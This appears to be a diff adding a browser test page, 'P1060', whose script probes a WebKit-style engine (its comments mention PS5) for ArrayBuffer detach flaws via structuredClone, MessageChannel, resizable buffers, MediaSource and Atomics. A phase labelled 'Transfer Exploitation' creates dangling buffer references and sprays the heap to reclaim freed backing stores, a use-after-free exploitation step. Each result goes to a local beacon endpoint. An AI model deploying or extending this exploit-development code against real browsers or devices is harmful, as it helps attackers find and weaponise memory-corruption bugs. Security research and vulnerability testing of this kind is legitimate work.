@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1060</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+</style></head><body>
+<div id="hud"><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1060-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var L=document.getElementById('log');
+function log(m,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+
+function hexq(v){
+  if(typeof v==='bigint')return '0x'+v.toString(16).padStart(16,'0');
+  return '0x'+(v>>>0).toString(16).padStart(8,'0');
+}
+
+bn('BOOT','ts='+Date.now().toString(36));
+log('=== P1060: structuredClone Detach + MSE ===','info');
+
+var totalAnomalies=0;
+var anomalyItems=[];
+
+// ============================================================
+// PHASE A: structuredClone transfer detach deep analysis
+// ============================================================
+function phaseA(){
+  log('--- Phase A: structuredClone Transfer Detach ---','info');
+  var details=[];
+
+  // A1: Basic transfer — does it clone or share backing store?
+  try{
+    var ab=new ArrayBuffer(256);
+    var orig=new Uint8Array(ab);
+    for(var i=0;i<256;i++) orig[i]=i;
+
+    var cloned=structuredClone({buf:ab},[ab]);
+    var cloneView=new Uint8Array(cloned.buf);
+
+    // Check if original is detached
+    details.push('A1-origLen='+ab.byteLength+'|cloneLen='+cloned.buf.byteLength);
+
+    if(ab.byteLength>0){
+      // NOT DETACHED! Check if they share backing store
+      var origView=new Uint8Array(ab);
+
+      // Write to clone, check original
+      cloneView[0]=0xFF;
+      var origSees=origView[0];
+      details.push('A1-sharedWrite=clone[0]=FF|orig[0]='+hexq(origSees));
+
+      if(origSees===0xFF){
+        details.push('A1-SHARED-BACKING=YES');
+        totalAnomalies++;
+        anomalyItems.push('A1-shared-backing');
+        log('*** SHARED BACKING STORE: writes to clone visible in original! ***','fail');
+
+        // Restore for later tests
+        cloneView[0]=0;
+        origView[0]=0;
+      }else{
+        details.push('A1-COPIED=independent-buffers');
+      }
+
+      // Write to original, check clone
+      origView[100]=0xAA;
+      var cloneSees=cloneView[100];
+      details.push('A1-reverseCheck=orig[100]=AA|clone[100]='+hexq(cloneSees));
+    }else{
+      details.push('A1-PROPERLY-DETACHED');
+    }
+  }catch(e){details.push('A1-err='+e.name+':'+e.message.slice(0,60));}
+
+  // A2: Double transfer — transfer the same buffer twice
+  try{
+    var ab2=new ArrayBuffer(128);
+    new Uint8Array(ab2)[0]=0xBB;
+
+    var clone2a=structuredClone({buf:ab2},[ab2]);
+    details.push('A2-first=origLen:'+ab2.byteLength+'|cloneLen:'+clone2a.buf.byteLength);
+
+    // Try to transfer again
+    try{
+      var clone2b=structuredClone({buf:ab2},[ab2]);
+      details.push('A2-second=origLen:'+ab2.byteLength+'|clone2Len:'+clone2b.buf.byteLength);
+
+      // If both succeeded and both have data, check for double reference
+      if(clone2a.buf.byteLength>0&&clone2b.buf.byteLength>0){
+        var v2a=new Uint8Array(clone2a.buf);
+        var v2b=new Uint8Array(clone2b.buf);
+        v2a[0]=0x11;
+        v2b[0]=0x22;
+        details.push('A2-doubleRef=a[0]='+hexq(v2a[0])+'|b[0]='+hexq(v2b[0]));
+        if(v2a[0]===0x22){
+          totalAnomalies++;
+          anomalyItems.push('A2-double-ref-shared');
+          log('*** DOUBLE TRANSFER SHARES BACKING: critical! ***','fail');
+        }
+      }
+    }catch(e){
+      details.push('A2-second-err='+e.name);
+    }
+  }catch(e){details.push('A2-err='+e.name);}
+
+  // A3: Transfer with BigInt64Array view still attached
+  try{
+    var ab3=new ArrayBuffer(64);
+    var bi=new BigInt64Array(ab3);
+    bi[0]=0xDEADBEEFCAFEn;
+
+    var clone3=structuredClone({buf:ab3},[ab3]);
+    details.push('A3-origLen='+ab3.byteLength);
+
+    if(ab3.byteLength>0){
+      // Original not detached — can we still read through BigInt64Array?
+      try{
+        var val=bi[0];
+        details.push('A3-bigint-read='+hexq(val));
+        if(val===0xDEADBEEFCAFEn){
+          details.push('A3-bigint-still-valid=YES');
+        }
+      }catch(e){
+        details.push('A3-bigint-err='+e.name);
+      }
+    }
+  }catch(e){details.push('A3-err='+e.name);}
+
+  // A4: Worker postMessage transfer vs structuredClone transfer
+  try{
+    var ab4=new ArrayBuffer(64);
+    new Uint8Array(ab4).fill(0xCC);
+
+    // First: worker postMessage transfer
+    var workerCode='onmessage=function(e){postMessage({len:e.data.buf.byteLength,v0:new Uint8Array(e.data.buf)[0]});}';
+    var blob=new Blob([workerCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+    URL.revokeObjectURL(url);
+
+    w.onmessage=function(e){
+      details.push('A4-workerGot=len:'+e.data.len+'|v0:'+hexq(e.data.v0));
+      details.push('A4-origAfterWorkerXfer='+ab4.byteLength);
+      w.terminate();
+    };
+    w.postMessage({buf:ab4},[ab4]);
+    details.push('A4-afterPostMsg=origLen:'+ab4.byteLength);
+  }catch(e){details.push('A4-err='+e.name);}
+
+  // A5: Stress test — transfer 100 buffers, check all detach states
+  try{
+    var detachedCount=0;
+    var aliveCount=0;
+    for(var i=0;i<100;i++){
+      var ab5=new ArrayBuffer(64);
+      new Uint8Array(ab5)[0]=i;
+      structuredClone({buf:ab5},[ab5]);
+      if(ab5.byteLength===0) detachedCount++;
+      else aliveCount++;
+    }
+    details.push('A5-stress=detached:'+detachedCount+'|alive:'+aliveCount+'/100');
+  }catch(e){details.push('A5-err='+e.name);}
+
+  log('Phase A: '+details.slice(0,4).join(' | '),'info');
+  bn('A-DETACH',details.join('|'));
+  return new Promise(function(resolve){setTimeout(resolve,200);});
+}
+
+// ============================================================
+// PHASE B: Free-after-transfer exploitation attempt
+// ============================================================
+function phaseB(){
+  log('');log('--- Phase B: Transfer Exploitation ---','info');
+  var details=[];
+
+  // B1: If structuredClone doesn't detach, try to create a dangling reference
+  // Transfer via postMessage (which DOES detach), then read through structuredClone's copy
+  try{
+    var ab=new ArrayBuffer(4096);
+    var u8=new Uint8Array(ab);
+    for(var i=0;i<4096;i++) u8[i]=0xAA;
+
+    // First: structuredClone "transfer" (doesn't detach on PS5)
+    var scCopy=structuredClone({buf:ab},[ab]);
+    details.push('B1-afterSC=origLen:'+ab.byteLength+'|copyLen:'+scCopy.buf.byteLength);
+
+    if(ab.byteLength>0){
+      // Original still alive. Now transfer via postMessage which DOES detach
+      var mc=new MessageChannel();
+      var detached=false;
+      mc.port2.onmessage=function(e){
+        details.push('B1-mcGot='+e.data.buf.byteLength);
+        mc.port1.close();mc.port2.close();
+      };
+      mc.port1.postMessage({buf:ab},[ab]);
+      details.push('B1-afterMC=origLen:'+ab.byteLength);
+
+      // Now try to read through the structuredClone copy
+      try{
+        var scView=new Uint8Array(scCopy.buf);
+        details.push('B1-scCopyStillValid=len:'+scView.length+'|v0:'+hexq(scView[0]));
+      }catch(e){
+        details.push('B1-scCopy-err='+e.name);
+      }
+    }else{
+      details.push('B1-alreadyDetached');
+    }
+  }catch(e){details.push('B1-err='+e.name);}
+
+  // B2: RAB transfer test
+  try{
+    var rab=new ArrayBuffer(64,{maxByteLength:1024});
+    var rv=new Uint8Array(rab);
+    rv[0]=0xDD;
+
+    var rabClone=structuredClone({buf:rab},[rab]);
+    details.push('B2-rabOrigLen='+rab.byteLength+'|cloneLen='+rabClone.buf.byteLength);
+
+    if(rab.byteLength>0){
+      // Can we resize after "transfer"?
+      try{
+        rab.resize(512);
+        details.push('B2-resize='+rab.byteLength);
+        // Check if clone sees the resize
+        details.push('B2-cloneAfterResize='+rabClone.buf.byteLength);
+      }catch(e){
+        details.push('B2-resize-err='+e.name);
+      }
+    }
+  }catch(e){details.push('B2-err='+e.name);}
+
+  // B3: Spray after transfer — try to reclaim the backing store
+  try{
+    var victimABs=[];
+    var victimViews=[];
+
+    // Create 50 buffers, "transfer" them via structuredClone
+    for(var i=0;i<50;i++){
+      var ab=new ArrayBuffer(256);
+      var v=new Uint8Array(ab);
+      for(var j=0;j<256;j++) v[j]=0xBB;
+      victimViews.push(v);
+      var clone=structuredClone({buf:ab},[ab]);
+      victimABs.push(clone.buf);
+    }
+
+    // Now transfer the originals via postMessage (which detaches them)
+    // Wait — if structuredClone didn't detach them, the originals are in victimViews
+    // Let's check one
+    details.push('B3-victimView0Len='+victimViews[0].length);
+
+    // Spray with different-sized buffers to try to reclaim
+    var sprays=[];
+    for(var i=0;i<500;i++){
+      var s=new ArrayBuffer(256);
+      var sv=new Uint8Array(s);
+      for(var j=0;j<256;j++) sv[j]=0xCC;
+      sprays.push(s);
+    }
+
+    // Check if any victim view now reads different data
+    var corrupted=0;
+    for(var i=0;i<victimViews.length;i++){
+      try{
+        var v=victimViews[i];
+        if(v.length>0&&v[0]!==0xBB){
+          corrupted++;
+          details.push('B3-CORRUPT-'+i+':expected=BB got='+hexq(v[0]));
+        }
+      }catch(e){}
+    }
+    details.push('B3-corrupted='+corrupted+'/50');
+    if(corrupted>0){
+      totalAnomalies++;
+      anomalyItems.push('B3-spray-reclaim');
+      log('*** SPRAY RECLAIMED TRANSFERRED BUFFERS! ***','fail');
+    }
+  }catch(e){details.push('B3-err='+e.name);}
+
+  log('Phase B: '+details.slice(0,4).join(' | '),'info');
+  bn('B-EXPLOIT',details.join('|'));
+  return Promise.resolve();
+}
+
+// ============================================================
+// PHASE C: MediaSource + SourceBuffer exploration
+// ============================================================
+function phaseC(){
+  log('');log('--- Phase C: MediaSource/SourceBuffer ---','info');
+  var details=[];
+
+  // C1: MediaSource basic
+  try{
+    if(typeof MediaSource==='undefined'){
+      details.push('C1-MSE=UNAVAILABLE');
+      bn('C-MSE',details.join('|'));
+      return Promise.resolve();
+    }
+
+    var supported=MediaSource.isTypeSupported;
+    var codecs=[
+      'video/mp4; codecs="avc1.42E01E"',
+      'video/mp4; codecs="avc1.64001F"',
+      'video/mp4; codecs="hev1.1.6.L93.B0"',
+      'video/webm; codecs="vp8"',
+      'video/webm; codecs="vp9"',
+      'video/webm; codecs="av01.0.00M.08"',
+      'audio/mp4; codecs="mp4a.40.2"',
+      'audio/webm; codecs="opus"',
+      'audio/webm; codecs="vorbis"'
+    ];
+    var supportedCodecs=[];
+    for(var i=0;i<codecs.length;i++){
+      if(supported(codecs[i])) supportedCodecs.push(codecs[i].split(';')[0]+':'+codecs[i].split('"')[1]);
+    }
+    details.push('C1-codecs='+supportedCodecs.join(','));
+  }catch(e){details.push('C1-err='+e.name);}
+
+  // C2: Create MediaSource and attach
+  try{
+    var ms=new MediaSource();
+    details.push('C2-readyState='+ms.readyState);
+    details.push('C2-duration='+ms.duration);
+
+    var video=document.createElement('video');
+    var msUrl=URL.createObjectURL(ms);
+    details.push('C2-url='+msUrl.slice(0,40));
+
+    // Check available APIs
+    var msProps=[];
+    for(var k in ms){
+      if(typeof ms[k]==='function'&&k!=='addEventListener'&&k!=='removeEventListener'&&k!=='dispatchEvent'){
+        msProps.push(k);
+      }
+    }
+    details.push('C2-methods='+msProps.join(','));
+  }catch(e){details.push('C2-err='+e.name);}
+
+  // C3: SourceBuffer API exploration
+  try{
+    var ms2=new MediaSource();
+    var video2=document.createElement('video');
+    video2.src=URL.createObjectURL(ms2);
+
+    return new Promise(function(resolve){
+      ms2.addEventListener('sourceopen',function(){
+        details.push('C3-sourceopen=YES');
+        try{
+          // Try to add a source buffer
+          var sb=ms2.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+          details.push('C3-sb=created');
+          details.push('C3-sbMode='+sb.mode);
+          details.push('C3-sbUpdating='+sb.updating);
+
+          // Check SourceBuffer properties
+          var sbProps=[];
+          for(var k in sb){
+            if(typeof sb[k]==='function'&&k!=='addEventListener'&&k!=='removeEventListener'){
+              sbProps.push(k);
+            }
+          }
+          details.push('C3-sbMethods='+sbProps.join(','));
+
+          // Try to append a small (invalid) segment
+          try{
+            var fakeSegment=new Uint8Array(64);
+            sb.appendBuffer(fakeSegment);
+            details.push('C3-append=accepted');
+
+            sb.addEventListener('error',function(){
+              details.push('C3-appendErr=error-event');
+              finish();
+            });
+            sb.addEventListener('updateend',function(){
+              details.push('C3-appendDone=OK');
+              finish();
+            });
+          }catch(e){
+            details.push('C3-append-err='+e.name);
+            finish();
+          }
+        }catch(e){
+          details.push('C3-addSB-err='+e.name);
+          finish();
+        }
+      });
+
+      ms2.addEventListener('error',function(){
+        details.push('C3-ms-error');
+        finish();
+      });
+
+      var finished=false;
+      function finish(){
+        if(finished)return;
+        finished=true;
+        log('Phase C: '+details.slice(0,4).join(' | '),'info');
+        bn('C-MSE',details.join('|'));
+        resolve();
+      }
+      setTimeout(finish,3000); // Timeout
+    });
+  }catch(e){
+    details.push('C3-err='+e.name);
+    log('Phase C: '+details.slice(0,3).join(' | '),'info');
+    bn('C-MSE',details.join('|'));
+    return Promise.resolve();
+  }
+}
+
+// ============================================================
+// PHASE D: Atomics on "transferred" buffer
+// ============================================================
+function phaseD(){
+  log('');log('--- Phase D: Atomics on Transferred Buffer ---','info');
+  var details=[];
+
+  // D1: Atomic operations on buffer that was "transferred" via structuredClone
+  try{
+    var ab=new ArrayBuffer(256);
+    var i32=new Int32Array(ab);
+    i32[0]=42;
+
+    // "Transfer" via structuredClone
+    var clone=structuredClone({buf:ab},[ab]);
+
+    details.push('D1-origLen='+ab.byteLength);
+
+    if(ab.byteLength>0){
+      // Original alive — try Atomics on original
+      try{
+        var atomicVal=Atomics.load(i32,0);
+        details.push('D1-atomicLoad='+atomicVal);
+      }catch(e){
+        details.push('D1-atomicLoad-err='+e.name);
+      }
+
+      // Try Atomics.store
+      try{
+        Atomics.store(i32,0,999);
+        details.push('D1-atomicStore=OK|val='+i32[0]);
+      }catch(e){
+        details.push('D1-atomicStore-err='+e.name);
+      }
+
+      // Check if clone sees the atomic write
+      var cloneView=new Int32Array(clone.buf);
+      details.push('D1-cloneSees='+cloneView[0]);
+      if(cloneView[0]===999){
+        totalAnomalies++;
+        anomalyItems.push('D1-atomic-shared');
+        log('*** ATOMIC WRITE VISIBLE IN CLONE: shared backing! ***','fail');
+      }
+
+      // D2: CAS on original, check clone
+      try{
+        var old=Atomics.compareExchange(i32,0,999,0xCAFE);
+        details.push('D2-cas=old:'+old+'|new:'+i32[0]);
+        details.push('D2-cloneSees='+cloneView[0]);
+      }catch(e){
+        details.push('D2-cas-err='+e.name);
+      }
+    }else{
+      details.push('D1-PROPERLY-DETACHED');
+    }
+  }catch(e){details.push('D1-err='+e.name);}
+
+  // D3: Worker + Atomics on "transferred" buffer
+  try{
+    var sab=new ArrayBuffer(256); // Not a SharedArrayBuffer but we have Atomics
+    var si32=new Int32Array(sab);
+    si32[0]=0;
+    si32[1]=0;
+
+    var clone2=structuredClone({buf:sab},[sab]);
+    details.push('D3-origLen='+sab.byteLength);
+
+    if(sab.byteLength>0){
+      // Create worker that does Atomics on a buffer
+      var wCode='onmessage=function(e){var i32=new Int32Array(e.data.buf);for(var i=0;i<10000;i++){Atomics.add(i32,0,1);}postMessage({final:Atomics.load(i32,0)});};';
+      var blob=new Blob([wCode],{type:'application/javascript'});
+      var url=URL.createObjectURL(blob);
+      var w=new Worker(url);
+      URL.revokeObjectURL(url);
+
+      // Send the CLONE buffer to worker
+      var cloneBuf=clone2.buf;
+      w.onmessage=function(e){
+        details.push('D3-workerResult='+e.data.final);
+        // Check original
+        details.push('D3-origAfterWorker='+si32[0]);
+        w.terminate();
+      };
+      // Don't transfer — send a copy so both main and worker can access
+      w.postMessage({buf:cloneBuf});
+    }
+  }catch(e){details.push('D3-err='+e.name);}
+
+  log('Phase D: '+details.slice(0,4).join(' | '),'info');
+  bn('D-ATOMICS',details.join('|'));
+  return new Promise(function(resolve){setTimeout(resolve,500);});
+}
+
+// ============================================================
+// Run
+// ============================================================
+setTimeout(function(){
+  phaseA().then(function(){
+    return phaseB();
+  }).then(function(){
+    return phaseC();
+  }).then(function(){
+    return phaseD();
+  }).then(function(){
+    log('');
+    log('=== P1060 COMPLETE: anomalies='+totalAnomalies+' ===',totalAnomalies>0?'fail':'ok');
+    if(anomalyItems.length>0) log('Items: '+anomalyItems.join(', '),'warn');
+    bn('DONE','anomalies='+totalAnomalies+'|items='+anomalyItems.join(';'));
+  }).catch(function(e){
+    log('FATAL: '+e.message,'fail');
+    bn('FATAL',e.message);
+  });
+},200);
+</script></body></html>
